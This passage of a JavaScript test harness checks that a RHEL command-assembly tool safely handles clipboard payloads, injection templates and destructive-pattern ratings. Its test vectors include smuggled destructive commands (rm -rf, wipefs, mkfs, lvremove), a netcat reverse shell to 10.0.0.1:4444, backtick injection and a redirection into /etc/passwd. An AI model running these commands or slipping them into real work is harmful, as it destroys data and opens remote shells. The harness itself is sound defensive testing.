        template: [{ lit: "probe" }, { flag: "--owner", eq: false, field: "owner", optional: true }] },
      {}, "probe"),
    hfCase("--flag value / optional value absent, not declared droppable",
      { id: "hf-spaced", fields: [F_OWNER],
        template: [{ lit: "probe" }, { flag: "--owner", eq: false, field: "owner" }] },
      {}, null)
  ];

  for (var hc = 0; hc < hfCases.length; hc++) {
    for (var hr2 = 0; hr2 < VERSIONS.length; hr2++) {
      var cs = hfCases[hc];
      halfFormed++;
      var got = A.assembleCommand(cs.spec, VERSIONS[hr2], cs.values, { patterns: [] });
      var gotCmd = got === null ? null : got.command;
      if (gotCmd !== cs.want) {
        stats.failures.push("half-formed / RHEL " + VERSIONS[hr2] + " / " + cs.id +
                            ": expected " + JSON.stringify(cs.want) + ", got " + JSON.stringify(gotCmd));
      }
      /* a command that survives may never end in a dangling option token */
      if (gotCmd !== null && /=$/.test(gotCmd)) {
        stats.failures.push("half-formed / RHEL " + VERSIONS[hr2] + " / " + cs.id +
                            ": the assembled command ends in a dangling '=' — " + JSON.stringify(gotCmd));
      }
    }
  }

  /* version-gated positional: the same template must not be well-formed on one
     release and mis-positioned on another. */
  var vgA = { name: "a", type: "zone", required: false, versions: ["9", "10"] };
  var vgB = { name: "b", type: "zone", required: true };
  for (var vg = 0; vg < VERSIONS.length; vg++) {
    var late = VERSIONS[vg] === "9" || VERSIONS[vg] === "10";
    var midSpec = { id: "hf-gated-mid", fields: [vgA, vgB],
                    template: [{ lit: "probe" }, { field: "a", optional: true }, { field: "b" }] };
    var tailSpec = { id: "hf-gated-tail", fields: [vgA, vgB],
                     template: [{ lit: "probe" }, { field: "b" }, { field: "a", optional: true }] };
    var midWant = late ? "probe 'public' 'trusted'" : null;
    var tailWant = late ? "probe 'trusted' 'public'" : "probe 'trusted'";
    halfFormed += 2;
    var midGot = A.assembleCommand(midSpec, VERSIONS[vg], { a: "public", b: "trusted" }, { patterns: [] });
    var tailGot = A.assembleCommand(tailSpec, VERSIONS[vg], { a: "public", b: "trusted" }, { patterns: [] });
    if ((midGot === null ? null : midGot.command) !== midWant) {
      stats.failures.push("half-formed [gated mid-positional] / RHEL " + VERSIONS[vg] + ": expected " +
                          JSON.stringify(midWant) + ", got " +
                          JSON.stringify(midGot === null ? null : midGot.command));
    }
    if ((tailGot === null ? null : tailGot.command) !== tailWant) {
      stats.failures.push("half-formed [gated trailing positional] / RHEL " + VERSIONS[vg] +
                          ": expected " + JSON.stringify(tailWant) + ", got " +
                          JSON.stringify(tailGot === null ? null : tailGot.command));
    }
  }

  /* ---- MCR-SEC-003: the clipboard payload --------------------------------
     No line of a clipboard payload may be unprefixed except the command itself.
     The header is never rendered in the gutter, so an unprefixed line is text
     that reaches a root shell having never been shown as part of the command.
     Every vector in the fixture is pushed through a header line, plus the
     newline vectors the review reproduced by hand. */
  var clipboardChecks = 0;
  var hostileHeaders = [
    "Prove the host firewall is running\nrm -rf /var/log/audit  # <- never rendered, always copied",
    "line one\r\nrm -rf /etc",
    "line one\rwipefs -a /dev/sda",
    "line one\u2028mkfs.xfs /dev/sdb",
    "line one\u2029lvremove -f /dev/vg0/lv0",
    "nul\u0000and more",
    "vertical\u000Btab",
    "form\u000Cfeed"
  ];
  for (var hv2 = 0; hv2 < vectors.length; hv2++) hostileHeaders.push(vectors[hv2].value);

  for (var ch = 0; ch < hostileHeaders.length; ch++) {
    clipboardChecks++;
    var payload = A.commentPayload(["MD CODE RED — RHEL 9", "intent: " + hostileHeaders[ch],
                                    "blast: green"], "systemctl is-active firewalld");
    if (payload === null) {
      stats.failures.push("clipboard payload " + ch + ": refused to compose for a header value; " +
                          "the header is sanitised, not rejected — only a hostile COMMAND may refuse");
      continue;
    }
    var plines = payload.split("\n");
    if (plines[plines.length - 1] !== "systemctl is-active firewalld") {
      stats.failures.push("clipboard payload " + ch + ": the command is not the last line — " +
                          JSON.stringify(payload));
      continue;
    }
    var bad = null;
    for (var pl = 0; pl < plines.length - 1; pl++) {
      if (plines[pl].indexOf("# ") !== 0) { bad = plines[pl]; break; }
    }
    if (bad !== null) {
      stats.failures.push("clipboard payload " + ch + ": an unprefixed line reached the clipboard — " +
                          JSON.stringify(bad) + " in " + JSON.stringify(payload));
      continue;
    }
    if (/[\u0000-\u0009\u000B-\u001F\u007F-\u009F\u2028\u2029]/.test(payload)) {
      stats.failures.push("clipboard payload " + ch + ": a control character survived into the " +
                          "clipboard text — " + JSON.stringify(payload));
    }
  }

  /* Marcus's reproduction, end to end: the header carried `rm -rf` and blastFor()
     never saw it because it only ever looked at the command. It must see it now. */
  clipboardChecks++;
  var reproPayload = A.commentPayload(
    ["MD CODE RED v1.0.0-dev — RHEL 9",
     "intent: Prove the host firewall is running\nrm -rf /var/log/audit  # <- never rendered, always copied",
     "blast: green"], "systemctl is-active firewalld");
  var reproBlast = A.blastFor(reproPayload, "green",
                              [{ id: "dp-rm-rf", match: "rm -rf", label: "l", why: "w", blast_floor: "red" }]);
  if (reproBlast.blast !== "red") {
    stats.failures.push("invariant: MCR-SEC-003 regression: a destructive pattern carried in the comment header did not " +
             "raise blast — blastFor() is not seeing the full clipboard payload");
  }
  /* a command that is not single-line printable text may not compose a payload */
  clipboardChecks++;
  if (A.commentPayload(["x"], "systemctl is-active firewalld\nrm -rf /") !== null) {
    stats.failures.push("invariant: MCR-SEC-003: commentPayload() accepted a multi-line command, which would put an " +
             "unprefixed second line on the clipboard");
  }
  if (A.headerSafe("a\nb\r\nc\u2028d") !== "a b c d") {
    stats.failures.push("invariant: MCR-SEC-003: headerSafe() does not flatten every line terminator to a space");
  }

  /* ---- MCR-SEC-006: template[].flag and template[].lit are curated, not
     unchecked. Both injection templates from the review must return null. ---- */
  var tokenChecks = 0;
  var badTokenSpecs = [
    ["flag carries a statement separator",
     { id: "tok-flag", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "--zone; rm -rf /etc; #", field: "z" }] },
     { z: "public" }],
    ["lit is a whole second command",
     { id: "tok-lit", fields: [],
       template: [{ lit: "echo hi; nc 10.0.0.1 4444 -e /bin/sh" }] },
     {}],
    ["flag carries a space",
     { id: "tok-flag-space", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "--zone --permanent", field: "z" }] },
     { z: "public" }],
    ["flag carries a quote",
     { id: "tok-flag-quote", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "--zone'", field: "z" }] },
     { z: "public" }],
    ["lit carries a backtick",
     { id: "tok-lit-backtick", fields: [],
       template: [{ lit: "echo `id`" }] },
     {}],
    ["lit carries a redirection",
     { id: "tok-lit-redir", fields: [],
       template: [{ lit: "cat>/etc/passwd" }] },
     {}],
    ["flag is not a flag at all",
     { id: "tok-flag-bare", fields: [{ name: "z", type: "zone", required: true }],
       template: [{ lit: "firewall-cmd" }, { flag: "zone", field: "z" }] },
     { z: "public" }]
  ];
  for (var bt = 0; bt < badTokenSpecs.length; bt++) {
    for (var btr = 0; btr < VERSIONS.length; btr++) {
      tokenChecks++;
      var btres = A.assembleCommand(badTokenSpecs[bt][1], VERSIONS[btr], badTokenSpecs[bt][2],
                                    { patterns: [] });
      if (btres !== null) {
        stats.failures.push("token allow-list / RHEL " + VERSIONS[btr] + " / " +
                            badTokenSpecs[bt][0] + ": assembled " + JSON.stringify(btres.command) +
                            " instead of returning null");
      }
    }
  }
  /* control: the legitimate tokens those hostile ones are variations of still work */
  for (var gtr = 0; gtr < VERSIONS.length; gtr++) {
    tokenChecks++;
    var good = A.assembleCommand(
      { id: "tok-ok", fields: [{ name: "z", type: "zone", required: true }],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "z" }, { lit: "--permanent" }] },
      VERSIONS[gtr], { z: "public" }, { patterns: [] });
    if (!good || good.command !== "firewall-cmd --zone='public' --permanent") {
      stats.failures.push("token allow-list control / RHEL " + VERSIONS[gtr] +
                          ": a legitimate flag and lit were refused — " +
                          JSON.stringify(good === null ? null : good.command));
    }
  }

  /* ---- MCR-SEC-008: every destructive pattern must be able to fire ---------
     shQuote() inserts a quote at every literal->value boundary, so a pattern
     that spans one could never match the post-quoting string. blastFor() now
     also matches the unquoted projection. Each row of content/dangerous.json is
     asserted to fire on a synthetic assembled command whose VALUE carries the
     pattern text; a row that can never fire fails this gate rather than sitting
     in the table looking like protection. */
  var patternChecks = 0;
  var dangerous = JSON.parse(fs.readFileSync(path.join(REPO, "content", "dangerous.json"), "utf8"));
  var patterns = dangerous.patterns || [];
  if (!patterns.length) stats.failures.push("content/dangerous.json carries no patterns to check");
  for (var dp = 0; dp < patterns.length; dp++) {
    var pat = patterns[dp];
    patternChecks++;
    var synth = A.assembleCommand(
      { id: "blast-" + pat.id, blast: "green",
        fields: [{ name: "v", type: "comment", required: true }],
        template: [{ lit: "probe" }, { field: "v" }] },
      "9", { v: pat.match }, { patterns: patterns });
    if (synth === null) {
      stats.failures.push("destructive pattern '" + pat.id + "': its match text could not be put " +
                          "into a synthetic command, so this row has never been seen to fire");
      continue;
    }
    if (synth.blast !== pat.blast_floor && !(pat.blast_floor === "yellow" && synth.blast === "red")) {
      stats.failures.push("destructive pattern '" + pat.id + "' (" + JSON.stringify(pat.match) +
                          ") did not raise blast to " + pat.blast_floor + " on " +
                          JSON.stringify(synth.command) + " — it fired on nothing");
    }
  }
  /* Marcus's C8 test, verbatim: `rm -rf /` must fire on `rm -rf '/etc/pki'` */
  patternChecks++;
  var rmrf = A.assembleCommand(
    { id: "blast-rm-rf-root", blast: "green",
      fields: [{ name: "p", type: "path", required: true }],
      template: [{ lit: "rm" }, { lit: "-rf" }, { field: "p" }] },
    "9", { p: "/etc/pki" }, { patterns: [{ id: "rm-rf", match: "rm -rf /", label: "l", why: "w",
                                           blast_floor: "red" }] });
  if (!rmrf || rmrf.command !== "rm -rf '/etc/pki'") {
    stats.failures.push("MCR-SEC-008 regression: the synthetic command did not assemble as expected");
  } else if (rmrf.blast !== "red") {
    stats.failures.push("MCR-SEC-008 regression: 'rm -rf /' did not fire on " +
                        JSON.stringify(rmrf.command) + " — a pattern spanning a value boundary is " +
                        "still silently disabled by the assembler's own quoting");
  }
  /* control: a pattern that genuinely does not occur must NOT fire */
  patternChecks++;
  var quiet = A.assembleCommand(
    { id: "blast-quiet", blast: "green",
      fields: [{ name: "p", type: "path", required: true }],
      template: [{ lit: "ls" }, { field: "p" }] },
    "9", { p: "/etc/pki" }, { patterns: [{ id: "rm-rf", match: "rm -rf /", label: "l", why: "w",
                                           blast_floor: "red" }] });
  if (!quiet || quiet.blast !== "green") {
    stats.failures.push("MCR-SEC-008 control: an unrelated command was rated " +
                        (quiet ? quiet.blast : "null") + " — the de-quoted matcher fires on anything");
  }

  /* ---- CR-T-17..25: every REAL generator spec, every REAL field -----------
     Everything above fuzzes a SYNTHETIC spec per field type — proof that the
     assembler's allow-lists hold in general. It says nothing about whether a
     particular generator's template wires a field to the slot its type
     promises, or whether an author-picked "documented" flag/lit token is
     still a closed-grammar token. This sweep loads content/commands.json
     itself and drives the exact specs CR-T-17..25 ships: for every generator
     entry and every field it declares, every OTHER field is held at its
     type's benign value and the field under test takes every hostile vector
     in turn, on every release the field is offered on. A field new to a
     future generator is picked up automatically — nothing here names a
     generator or a field by id. */
  var contentSpecChecks = 0;
  var commandsContent = JSON.parse(fs.readFileSync(path.join(REPO, "content", "commands.json"), "utf8"));
  var specEntries = (commandsContent.entries || []).filter(function (e) { return !!e.template; });
  if (!specEntries.length) {
    stats.failures.push("content/commands.json carries no generator (template) entries for the " +
                        "content-spec sweep to fuzz — CR-T-17's registry has nothing to prove itself on");
  }
  /* MCR-SEC-021, condition E6. This took opts[0] for an enum, so every other
     field in a hostile run was held at the FIRST option — `install`, never
     `remove`; `start`, never `stop`. `rot` rotates through the option list
     instead, and the caller passes the vector index, so a hostile value is
     fuzzed against every branch of every neighbouring enum rather than only the
     safest one. The check count does not change; the coverage does. Whether
     every branch is exercised as a CONTROL, with its blast asserted, is the
     separate enum-branch sweep further down — this half is about what the
     hostile sweep holds constant while it fuzzes. */
  function benignFor(field, rot) {
    if (field.type === "enum") {
      var opts = field.options || [];
      if (!opts.length) return undefined;
      var pick = opts[(rot || 0) % opts.length];
      return (typeof pick === "string") ? pick : pick.value;
    }
    var def = fx.field_types[field.type];
    return def ? def.benign : undefined;
  }
  for (var se = 0; se < specEntries.length; se++) {
    var centry = specEntries[se];
    var cfields = centry.fields || [];
    var centryVersions = centry.versions || VERSIONS;
    for (var cf = 0; cf < cfields.length; cf++) {
      var targetField = cfields[cf];
      var targetBenign = benignFor(targetField);
      if (targetBenign === undefined) {
        stats.failures.push("content spec " + centry.id + ": field '" + targetField.name +
                            "' has type '" + targetField.type + "', which tests/fixtures/" +
                            "hostile-inputs.json has no benign value for — this sweep cannot fuzz it");
        continue;
      }
      var fieldVersions = targetField.versions || VERSIONS;
      for (var cv = 0; cv < centryVersions.length; cv++) {
        var version = centryVersions[cv];
        if (VERSIONS.indexOf(version) < 0) continue;         /* spec.versions has to name a real release */
        if (fieldVersions.indexOf(version) < 0) continue;    /* field itself is gated off this release */
        for (var vv = 0; vv < vectors.length; vv++) {
          var vec = vectors[vv];
          /* The "empty" vector on an OPTIONAL field is not a hostile-input
             question at all: an empty value is "not supplied" (validateSpec),
             so the field is simply dropped and the template still assembles —
             correct, and already the exact case the harness's own
             never-half-formed sweep exists to prove, on every template shape.
             Asserting "reject" here would fail on correct behaviour, not catch
             a bug — required fields still get the empty vector, since an
             empty REQUIRED field must be rejected. */
          if (vec.id === "empty" && !targetField.required) continue;
          /* E6: the neighbouring fields are held benign, and every enum among
             them rotates through its options with the vector index rather than
             sitting on opts[0] for the whole sweep. */
          var values = {};
          for (var of = 0; of < cfields.length; of++) {
            if (of === cf) continue;
            var otherBenign = benignFor(cfields[of], vv);
            if (otherBenign !== undefined) values[cfields[of].name] = otherBenign;
          }
          values[targetField.name] = vec.value;
          var probe = { id: centry.id, tool: centry.tool, blast: centry.blast || "green",
                        fields: centry.fields, template: centry.template, versions: centry.versions };
          probe._hostileField = targetField.name;
          probe._benign = targetBenign;
          contentSpecChecks++;
          check(centry.id + " / field " + targetField.name + " / " + vec.id + " / RHEL " + version,
                vec["class"], probe, version, values, vec.value,
                targetField.type === "comment" ? vec.free_text : "reject");
        }
      }
    }
  }

  /* ---- CR-T-17..25: the GOLDEN-COMMAND table (MCR-SEC-015 / E1, E6) -------
     The sweep above is a containment oracle and nothing more. This is the
     validity oracle Marcus Reed's D4 review required: for every generator, on
     every release, the exact command it must emit for a stated set of benign
     values, hand-authored from each tool's man page in
     tests/fixtures/golden-commands.json and never generated from the assembler.

     Three assertions per row, plus two completeness assertions over the table:
       1. EXACT equality with the golden string (or null where the generator is
          gated off that release — null, never a shortened command).
       2. getopt(3) syntax, via optionSyntaxErrors(): no short option may be
          joined to its value with '='.
       3. every long option the template binds to a value still carries its
          '=' join, so the E1 fix cannot over-correct and quietly turn
          `--unit='sshd.service'` into `--unit 'sshd.service'` unnoticed.
     ...and the blast rating the row declares, computed against the REAL
     content/dangerous.json table rather than an empty one. */
  var golden = JSON.parse(fs.readFileSync(path.join(REPO, "tests", "fixtures",
                                                    "golden-commands.json"), "utf8"));
  var goldenRows = golden.generators || {};
  var realPatterns = (JSON.parse(fs.readFileSync(path.join(REPO, "content", "dangerous.json"),
                                                 "utf8")).patterns) || [];
  var goldenChecks = 0, syntaxChecks = 0, inspectorChecks = 0;
  for (var gs = 0; gs < specEntries.length; gs++) {
    var gentry = specEntries[gs];
    var grow = Object.prototype.hasOwnProperty.call(goldenRows, gentry.id) ? goldenRows[gentry.id] : null;
    if (grow === null) {
      stats.failures.push("golden table: generator " + gentry.id + " has no row in tests/fixtures/" +
                          "golden-commands.json. A generator whose exact command is not written down " +
                          "is covered by the containment oracle only, which is how MCR-SEC-015 shipped");
      continue;
    }
    var glongs = longValueFlags(gentry);
    for (var gv2 = 0; gv2 < VERSIONS.length; gv2++) {
      var gver = VERSIONS[gv2];
      if (!Object.prototype.hasOwnProperty.call(grow.commands || {}, gver)) {
        stats.failures.push("golden table: " + gentry.id + " has no expected command for RHEL " + gver);
        continue;
      }
      var want = grow.commands[gver];
      goldenChecks++;
      var gres;
      try {
        gres = A.assembleCommand(gentry, gver, grow.values || {}, { patterns: realPatterns });
      } catch (ge) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": assembler threw " + ge.message);
        continue;
      }
      var gotCommand = gres === null ? null : gres.command;
      if (gotCommand !== want) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": expected " +
                            JSON.stringify(want) + " but the assembler produced " +
                            JSON.stringify(gotCommand) + " — " + (grow.pins || ""));
        continue;
      }
      if (gres === null) continue;                 /* correctly gated off this release */
      if (gres.blast !== grow.blast) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": blast is '" + gres.blast +
                            "', the table says '" + grow.blast + "'");
      }
      /* MCR-SEC-023: the flag-by-flag panel must name every option the command
         shows, in the order it shows them — option tokens AND option-shaped
         literals. A panel silent about a flag that is present is a smaller
         version of a panel describing one that is not. */
      inspectorChecks++;
      var gotFlags = [];
      for (var gf = 0; gf < gres.flags.length; gf++) gotFlags.push(gres.flags[gf].flag);
      var wantFlags = grow.flags || [];
      if (gotFlags.join(" ") !== wantFlags.join(" ")) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": the inspector's flag list " +
                            "is [" + gotFlags.join(", ") + "], the table says [" + wantFlags.join(", ") +
                            "] — the panel and the command must agree (MCR-SEC-023)");
      }
      for (var gfc = 0; gfc < gotFlags.length; gfc++) {
        inspectorChecks++;
        if (gres.command.indexOf(gotFlags[gfc]) < 0) {
          stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": the inspector names flag " +
                              gotFlags[gfc] + ", which is not in " + JSON.stringify(gres.command) +
                              " — describing a flag that is not present is the Explainer row of " +
                              "threat-model §4");
        }
      }
      syntaxChecks++;
      var gsyn = optionSyntaxErrors(gres.command);
      if (gsyn.length) {
        stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": " + gsyn.join("; ") +
                            " — in " + JSON.stringify(gres.command));
      }
      for (var gl = 0; gl < glongs.length; gl++) {
        syntaxChecks++;
        if (gres.command.indexOf(glongs[gl] + "='") < 0) {
          stats.failures.push("golden " + gentry.id + " / RHEL " + gver + ": long option " +
                              glongs[gl] + " lost its '=' join in " + JSON.stringify(gres.command) +
                              " — E1 removes the '=' from SHORT options only");
        }
      }
    }
  }
  var goldenIds = Object.keys(goldenRows);
  for (var gi = 0; gi < goldenIds.length; gi++) {
    var known = false;
    for (var gk = 0; gk < specEntries.length; gk++) {
      if (specEntries[gk].id === goldenIds[gi]) { known = true; break; }
    }
    if (!known) {
      stats.failures.push("golden table: row '" + goldenIds[gi] + "' names a generator that is not " +
                          "in content/commands.json — a stale expectation proves nothing");
    }
  }
  /* negative control: the syntax oracle must be able to fail, on the exact
     defect MCR-SEC-015 reported and on the long form it must NOT flag. */
  if (!optionSyntaxErrors("auditctl -w='/etc/motd' -p='r' -k='identity'").length) {
    stats.failures.push("invariant: the option-syntax oracle rated MCR-SEC-015's own reproduction " +
                        "as valid getopt syntax — it cannot fail and therefore proves nothing");
  }
  if (optionSyntaxErrors("firewall-cmd --set-default-zone='public' --permanent").length) {
    stats.failures.push("invariant: the option-syntax oracle flagged a correct GNU long option");
  }
  if (optionSyntaxErrors("rsyslogd -N1 -f '/etc/rsyslog.conf'").length) {
    stats.failures.push("invariant: the option-syntax oracle flagged the glued short option -N1, " +
                        "which is legal");
  }

  /* ---- the DERIVED positional discriminator (MCR-SEC-018/022, E3 and E7) --
     Marcus Reed's D4 addendum table, run as a test on every release.

     The D1 rule says a conditional literal occupies an argument slot, so it may
     only vanish when every later positional token vanishes with it. Milo's first
     answer was a DECLARED discriminator: a `flag` key alongside `lit` told the
     rule "this literal is an option, look away". Neither half checked that the
     declaration was true, so `{lit:"0644", flag:"-P", requires:"m"}` was
     accepted and reopened MCR-SEC-013 through the key that was meant to close
     it. A rule a sibling key silently disables is not a rule.

     The discriminator is now DERIVED from the word the token actually emits: a
     `lit` matching FLAG_TOKEN_RE is an option and never occupies an argument
     slot. There is no second key to disagree with the first, so the smuggle
     cannot be expressed — and a token carrying both `lit` and `flag` is refused
     outright, at build time and at run time, because `flag` emits nothing there
     and exists only to point the rule away from the word that does.

     Template under test: [{lit:"chmod"}, TOKEN, {field:"p"}] — `m` optional,
     `p` a required path, exactly the shape of the original MCR-SEC-013 vector. */
  var discChecks = 0;
  function discSpec(tok) {
    return { id: "harness-discriminator", tool: "harness", blast: "green",
             fields: [{ name: "m", type: "integer", required: false, versions: VERSIONS },
                      { name: "p", type: "path", required: true, versions: VERSIONS }],
             template: [{ lit: "chmod" }, tok, { field: "p" }] };
  }
  var discCases = [
    [{ lit: "0644", requires: "m" }, "chmod 0644 '/etc/foo'", null,
     "the baseline MCR-SEC-013 vector: a bare conditional literal is positional, so it may not " +
     "drop while the path after it survives"],
    [{ lit: "-P", flag: "-P", requires: "m" }, null, null,
     "the dual-key shape the branch shipped twice. `flag` emits nothing on a lit token; it only " +
     "switched the positional rule off. Refused now even when it tells the truth, because a rule " +
     "that can be switched off by a key nobody checks is not a rule (MCR-SEC-022)"],
    [{ lit: "0644", flag: "-P", requires: "m" }, null, null,
     "Marcus's smuggle: an ARGUMENT literal wearing an option's flag key. This assembled " +
     "`chmod '/etc/foo'` with the path in the mode slot — MCR-SEC-013, reopened"],
    [{ lit: "/etc/shadow", flag: "-x", requires: "m" }, null, null,
     "the same smuggle with a path literal, which is the shape that actually hurts"],
    [{ lit: "-P", requires: "m" }, "chmod -P '/etc/foo'", "chmod '/etc/foo'",
     "the DERIVED answer, and the shape gen-setsebool-set and gen-lvextend-grow now use: an " +
     "option-shaped literal is an option, so dropping it shifts nothing and both states are " +
     "correct — with no key at all"]
  ];
  for (var dc = 0; dc < discCases.length; dc++) {
    for (var dv = 0; dv < VERSIONS.length; dv++) {
      var dspec = discSpec(discCases[dc][0]);
      discChecks += 2;
      var withM = A.assembleCommand(dspec, VERSIONS[dv], { m: "7", p: "/etc/foo" }, { patterns: [] });
      var noM = A.assembleCommand(dspec, VERSIONS[dv], { p: "/etc/foo" }, { patterns: [] });
      var gotWith = withM === null ? null : withM.command;
      var gotNo = noM === null ? null : noM.command;
      if (gotWith !== discCases[dc][1]) {
        stats.failures.push("discriminator / RHEL " + VERSIONS[dv] + " / " +
                            JSON.stringify(discCases[dc][0]) + " with 'm' supplied: expected " +
                            JSON.stringify(discCases[dc][1]) + ", got " + JSON.stringify(gotWith) +
                            " — " + discCases[dc][3]);
      }
      if (gotNo !== discCases[dc][2]) {
        stats.failures.push("discriminator / RHEL " + VERSIONS[dv] + " / " +
                            JSON.stringify(discCases[dc][0]) + " with 'm' ABSENT: expected " +
                            JSON.stringify(discCases[dc][2]) + ", got " + JSON.stringify(gotNo) +
                            " — " + discCases[dc][3]);
      }
    }
  }
  /* MCR-SEC-023 on the derived shape: the option-shaped literal reaches the
     inspector's flag list, so the panel and the command say the same thing. */
  discChecks++;
  var discFlagged = A.assembleCommand(discSpec({ lit: "-P", requires: "m" }), "9",
                                      { m: "7", p: "/etc/foo" }, { patterns: [] });
  if (!discFlagged || discFlagged.flags.length !== 1 || discFlagged.flags[0].flag !== "-P") {
    stats.failures.push("discriminator: an option-shaped literal did not reach the inspector's flag " +
                        "list — flags=" + JSON.stringify(discFlagged ? discFlagged.flags : null) +
                        " (MCR-SEC-023)");
  } else if (discFlagged.flags[0].explain !== null) {
    stats.failures.push("discriminator: an uncurated option-shaped literal was given an explanation " +
                        "rather than null — the no-guess law renders 'unverified' from null");
  }
  /* control: the shipped content carries no dual-key token any more. */
  for (var dk = 0; dk < specEntries.length; dk++) {
    var dtpl = specEntries[dk].template || [];
    for (var dt = 0; dt < dtpl.length; dt++) {
      discChecks++;
      if (dtpl[dt] && dtpl[dt].lit !== undefined && dtpl[dt].flag !== undefined) {
        stats.failures.push("content spec " + specEntries[dk].id + " template[" + dt + "] carries " +
                            "both `lit` and `flag` — the declared discriminator is gone and the " +
                            "derived one needs no key (MCR-SEC-022)");
      }
    }
  }

  /* ---- every enum BRANCH, not just opts[0] (MCR-SEC-021, condition E6) ---
     benignFor() takes opts[0] for an enum, so the control value was always the
     first option — `install`, never `remove`; `start`, never `stop` or
     `disable`. The destructive branch of every action enum was never the benign
     control, so the blast interaction on it was never asserted: Marcus checked
     those four by hand and they behaved, but a gate nobody runs by hand is the
     only kind that stays true.

     Every generator x every enum field x every option x every release, against
     the REAL content/dangerous.json table:
       - it must assemble (or be null exactly when the option or the spec is
         gated off that release),
       - it must be valid getopt syntax,
       - it must not rate BELOW the blast the spec declares, and
       - a destructive branch must come out at least yellow.

     The destructive list is content, in the golden fixture, not a judgement
     buried here. And it is checked in the honest direction: for a generator
     DECLARED green, a destructive branch must be RAISED to yellow by the
     pattern table — the "two ways in" design actually working on real content —
     while a non-destructive branch must stay green. A matcher that fired on
     everything would satisfy the first assertion and fail the second. */
  var branchChecks = 0;
  var RANK = { green: 0, yellow: 1, red: 2 };
  var destructive = (golden._enum_branches || {}).destructive || [];
  if (!destructive.length) {
    stats.failures.push("the golden fixture declares no destructive enum options — the blast " +
                        "interaction this sweep exists to assert would be vacuous");
  }
  for (var eb = 0; eb < specEntries.length; eb++) {
    var eentry = specEntries[eb];
    var erow = goldenRows[eentry.id];
    if (!erow) continue;                          /* already reported by the golden sweep */
    var efields = eentry.fields || [];
    var declared = eentry.blast || "green";
    var sawGreen = false, sawRaised = false, hasDestructive = false;
    for (var ef = 0; ef < efields.length; ef++) {
      if (efields[ef].type !== "enum") continue;
      var eopts = efields[ef].options || [];
      for (var eo = 0; eo < eopts.length; eo++) {
        var optRaw = eopts[eo];
        var optVal = (typeof optRaw === "string") ? optRaw : optRaw.value;
        var optVersions = (typeof optRaw === "string") ? null : (optRaw.versions || null);
        for (var ev = 0; ev < VERSIONS.length; ev++) {
          var erel = VERSIONS[ev];
          var evalues = {}, ek;
          for (ek in (erow.values || {})) {
            if (Object.prototype.hasOwnProperty.call(erow.values, ek)) evalues[ek] = erow.values[ek];
          }
          evalues[efields[ef].name] = optVal;
          branchChecks++;
          var eres = A.assembleCommand(eentry, erel, evalues, { patterns: realPatterns });
          var offRelease = (erow.commands[erel] === null) ||
                           (optVersions !== null && optVersions.indexOf(erel) < 0) ||
                           (efields[ef].versions && efields[ef].versions.indexOf(erel) < 0);
          if (eres === null) {
            if (!offRelease) {
              stats.failures.push("enum branch " + eentry.id + " / " + efields[ef].name + "=" +
                                  optVal + " / RHEL " + erel + ": returned null, but this option " +
                                  "is offered on this release");
            }
            continue;
          }
          if (offRelease) {
            stats.failures.push("enum branch " + eentry.id + " / " + efields[ef].name + "=" +
                                optVal + " / RHEL " + erel + ": assembled " +
                                JSON.stringify(eres.command) + " on a release it is gated off");
            continue;
          }
          var esyn = optionSyntaxErrors(eres.command);
          if (esyn.length) {
            stats.failures.push("enum branch " + eentry.id + " / " + efields[ef].name + "=" +
                                optVal + " / RHEL " + erel + ": " + esyn.join("; ") + " — in " +
                                JSON.stringify(eres.command));
          }
          if (RANK[eres.blast] < RANK[declared]) {
            stats.failures.push("enum branch " + eentry.id + " / " + efields[ef].name + "=" +
                                optVal + " / RHEL " + erel + ": rated '" + eres.blast + "', below " +
                                "the '" + declared + "' the spec declares");
          }
          if (destructive.indexOf(optVal) >= 0) {
            hasDestructive = true;
            if (RANK[eres.blast] < RANK.yellow) {
              stats.failures.push("enum branch " + eentry.id + " / " + efields[ef].name + "=" +
                                  optVal + " / RHEL " + erel + ": a DESTRUCTIVE branch rated '" +
                                  eres.blast + "'. " + JSON.stringify(eres.command) + " must be at " +
                                  "least yellow, whether by the spec's own declaration or by the " +
                                  "destructive-pattern table firing on the de-quoted command");
            }
            if (declared === "green" && RANK[eres.blast] >= RANK.yellow) sawRaised = true;
          } else if (eres.blast === "green") {
            sawGreen = true;
          }
        }
      }
    }
    if (declared === "green" && hasDestructive) {
      branchChecks += 2;
      if (!sawRaised) {
        stats.failures.push("enum branch " + eentry.id + ": declared green with a destructive " +
                            "branch, and no branch was ever RAISED — MCR-SEC-008's de-quoted " +
                            "projection is not firing on this generator's real content");
      }
      if (!sawGreen) {
        stats.failures.push("enum branch " + eentry.id + ": declared green and NO branch came out " +
                            "green — a pattern table that rates everything yellow satisfies the " +
                            "destructive assertion above while proving nothing");
      }
    }
  }

  /* ---- closed grammars where one exists (MCR-SEC-016, condition E4) ------
     threat-model §3.1 requires a closed grammar wherever the field has one, and
     `comment` — the single free-text type — was carrying four fields that do:
     two LVM sizes and two group lists. Nothing was injectable (every value is
     shQuote'd and every one of them fails closed at the target tool), but
     `lvextend -L 'ticket RFC-1234' -r '/dev/vg0/lv0'` assembled, returned
     non-null and rendered Copy — a nonsense LVM size accepted as a complete
     command on a yellow-blast storage tool.

     The sharp case is the one the placeholder now has to teach: `10G` and
     `+10G` are BOTH valid LVM sizes and they mean different things — set the
     volume to 10G, versus grow it by 10G. A grammar that accepts both still
     has to show the operator which one they typed. */
  var grammarChecks = 0;
  var grammarCases = [
    ["lvm_size", "10G", true], ["lvm_size", "+10G", true], ["lvm_size", "512", true],
    ["lvm_size", "1.5T", true], ["lvm_size", "100%FREE", true], ["lvm_size", "50%VG", true],
    ["lvm_size", "8m", true],
    ["lvm_size", "ticket RFC-1234", false], ["lvm_size", "10 G", false],
    ["lvm_size", "10GB", false], ["lvm_size", "-10G", false], ["lvm_size", "big", false],
    ["lvm_size", "10G;id", false], ["lvm_size", "100%EVERYTHING", false],
